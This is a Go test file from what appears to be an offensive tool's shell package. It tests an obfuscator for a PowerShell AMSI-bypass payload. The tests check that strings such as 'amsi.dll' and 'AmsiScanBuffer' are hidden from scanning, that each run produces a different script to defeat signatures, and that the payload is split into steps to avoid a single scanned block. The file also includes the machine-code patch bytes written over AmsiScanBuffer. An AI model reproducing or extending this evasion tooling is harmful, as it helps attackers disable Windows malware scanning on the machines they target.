package shell

import (
	"math/rand"
	"regexp"
	"strconv"
	"strings"
	"testing"
)

func obf(seed int64) string {
	return obfuscateBypass(bypass4MSITemplate, rand.New(rand.NewSource(seed)))
}

// The whole point of the randomisation: the script that patches AMSI is itself
// scanned by AMSI, so the names it is looking for must not appear literally.
func TestObfuscationLeavesNoTelltaleLiterals(t *testing.T) {
	for seed := int64(1); seed <= 20; seed++ {
		got := obf(seed)
		for _, lit := range []string{"amsi.dll", "AmsiScanBuffer", "kernel32.dll", "System.dll"} {
			if strings.Contains(got, lit) {
				t.Errorf("seed %d: script still contains the literal %q", seed, lit)
			}
		}
	}
}

// A leftover placeholder or marker would be a syntax error on the target, and
// the failure would surface as an unhelpful PowerShell parse error mid-patch.
func TestObfuscationConsumesEveryPlaceholder(t *testing.T) {
	for seed := int64(1); seed <= 20; seed++ {
		got := obf(seed)
		for _, frag := range []string{">><", "<><", "FUNCTION1", "FUNCTION2", "VAR1", "VAR12"} {
			if strings.Contains(got, frag) {
				t.Errorf("seed %d: unconsumed %q remains", seed, frag)
			}
		}
	}
}

// VAR1's placeholder is a prefix of VAR12's, so a careless replacement turns
// $VAR12 into "$something2" -- a different, undefined variable. The payload
// would then silently patch nothing.
func TestVar1DoesNotClobberVar12(t *testing.T) {
	tmpl := ">><VAR1>>< = 1\n>><VAR12>>< = 2\n"
	got := obfuscateBypass(tmpl, rand.New(rand.NewSource(7)))
	names := regexp.MustCompile(`\$[A-Za-z0-9]+`).FindAllString(got, -1)
	if len(names) != 2 {
		t.Fatalf("got %d variables in %q, want 2", len(names), got)
	}
	if names[0] == names[1] {
		t.Errorf("VAR1 and VAR12 collapsed to the same name %q", names[0])
	}
	if strings.Contains(got, names[0]+"2") {
		t.Errorf("VAR12 was rendered as VAR1's name plus '2': %q", got)
	}
}

// charExprRe matches the two forms oneCharExpression emits, so a test can
// evaluate the arithmetic the target would.
var charExprRe = regexp.MustCompile(`(?i)\[char\]\((\d+)-(\d+)\)|\[char\]\(\[byte\] 0x([0-9a-f]+)-0x([0-9a-f]+)\)`)

// decodeCharExpr evaluates a generated expression back to its string, the way
// PowerShell would. If this does not round-trip, the payload is corrupt in a way
// no amount of live testing on one box would reliably reveal.
func decodeCharExpr(t *testing.T, expr string) string {
	t.Helper()
	var sb strings.Builder
	for _, m := range charExprRe.FindAllStringSubmatch(expr, -1) {
		var val, off int64
		var err error
		if m[1] != "" {
			val, _ = strconv.ParseInt(m[1], 10, 32)
			off, err = strconv.ParseInt(m[2], 10, 32)
		} else {
			val, _ = strconv.ParseInt(m[3], 16, 32)
			off, err = strconv.ParseInt(m[4], 16, 32)
		}
		if err != nil {
			t.Fatalf("unparseable expression %q", expr)
		}
		sb.WriteByte(byte(val - off))
	}
	return sb.String()
}

func TestCharExpressionRoundTrips(t *testing.T) {
	r := rand.New(rand.NewSource(3))
	for _, s := range []string{"amsi.dll", "AmsiScanBuffer", "kernel32.dll", `\`, "System.dll", "MyDelegateType"} {
		for i := 0; i < 40; i++ { // many draws: the encoding picks a form at random
			expr := charExpression(s, r)
			if got := decodeCharExpr(t, expr); got != s {
				t.Fatalf("charExpression(%q) decoded to %q via %q", s, got, expr)
			}
		}
	}
}

// A byte form whose value would exceed 0xFF cannot be written as [byte] 0x1xx,
// so the encoder must fall back rather than emit something that will not parse.
func TestCharExpressionHandlesHighBytes(t *testing.T) {
	r := rand.New(rand.NewSource(11))
	for i := 0; i < 500; i++ {
		expr := oneCharExpression(0xFE, r)
		if got := decodeCharExpr(t, expr); got != "\xfe" {
			t.Fatalf("0xFE encoded as %q, decoded to %q", expr, got)
		}
	}
}

// The payload's own bytes must survive verbatim: this is the stub written over
// AmsiScanBuffer's prologue, and a corrupted one would be executed.
func TestPatchBytesAreUnchanged(t *testing.T) {
	const patch = "0xb8,0x34,0x12,0x07,0x80,0x66,0xb8,0x32,0x00,0xb0,0x57,0xc3"
	if !strings.Contains(bypass4MSITemplate, patch) {
		t.Fatal("the template no longer carries upstream's patch bytes")
	}
	if !strings.Contains(obf(5), patch) {
		t.Error("obfuscation altered the patch bytes")
	}
}

// The payload is deliberately run as separate commands; collapsing it into one
// would put the whole patch in a single scanned block.
func TestTemplateSplitsIntoSteps(t *testing.T) {
	steps := strings.Split(obf(9), jumpMarker)
	if len(steps) != 10 {
		t.Errorf("got %d steps, want 10 (upstream's split)", len(steps))
	}
	for i, s := range steps {
		if strings.TrimSpace(s) == "" {
			t.Errorf("step %d is empty", i+1)
		}
	}
}

// Two invocations must not produce the same script, or a signature written
// against one run matches every later one.
func TestObfuscationDiffersPerInvocation(t *testing.T) {
	if obf(1) == obf(2) {
		t.Error("two invocations produced identical scripts")
	}
}

// Random identifiers must be valid PowerShell names: a leading digit makes
// `$7abc` parse as something else entirely.
func TestRandomIdentIsUsable(t *testing.T) {
	r := rand.New(rand.NewSource(13))
	ok := regexp.MustCompile(`^[A-Za-z0-9]{7,17}$`)
	for i := 0; i < 200; i++ {
		if id := randomIdent(r, 7, 17); !ok.MatchString(id) {
			t.Fatalf("randomIdent produced %q", id)
		}
	}
}

func TestRandomCasePreservesLetters(t *testing.T) {
	r := rand.New(rand.NewSource(17))
	for i := 0; i < 100; i++ {
		got := randomCase("ForEach-Object", r)
		if !strings.EqualFold(got, "ForEach-Object") {
			t.Fatalf("randomCase changed more than casing: %q", got)
		}
	}
}

func TestObfuscatedScriptIsBalanced(t *testing.T) {
	got := obf(23)
	for _, pair := range []struct{ open, close string }{{"(", ")"}, {"{", "}"}, {"[", "]"}} {
		if o, c := strings.Count(got, pair.open), strings.Count(got, pair.close); o != c {
			t.Errorf("unbalanced %s%s: %d vs %d", pair.open, pair.close, o, c)
		}
	}
	if n := strings.Count(got, `"`); n%2 != 0 {
		t.Errorf("odd number of double quotes (%d)", n)
	}
}
